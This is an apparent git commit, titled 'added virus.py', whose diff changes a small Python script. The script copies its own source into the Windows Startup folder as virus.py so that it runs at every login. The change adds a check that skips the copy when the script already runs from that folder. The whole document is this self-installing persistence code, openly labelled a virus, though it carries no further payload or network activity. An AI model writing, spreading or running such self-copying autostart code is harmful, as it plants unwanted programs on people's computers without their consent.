6b4fb8bdf1910358b43a19d7f98e47519f9c41f8
azachia <a.zachia@hotmail.com>
2024-10-08 08:32:44 +0200

    added virus.py

--- script.py
+++ script.py
@@ -2,18 +2,22 @@ import os
 
 startup = "C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup" % os.getlogin()
 
-print(startup)
-print(__file__)
+
+file_location = os.path.dirname(os.path.realpath(__file__))
+
+folder_containing = os.path.dirname(file_location)
+
+if not folder_containing == startup:
 
 
-# add this file in startup folder
-if os.path.isdir(startup):
-    with open(startup + "/virus.py", "w") as f:
-        f.write(open(__file__).read())
-        
-        print("File added to startup folder")
-        
-        print(startup)
-        
-else:
-    print("Startup folder not found")
+    # add this file in startup folder
+    if os.path.isdir(startup):
+        with open(startup + "/virus.py", "w") as f:
+            f.write(open(__file__).read())
+            
+            print("File added to startup folder")
+            
+            print(startup)
+            
+    else:
+        print("Startup folder not found")
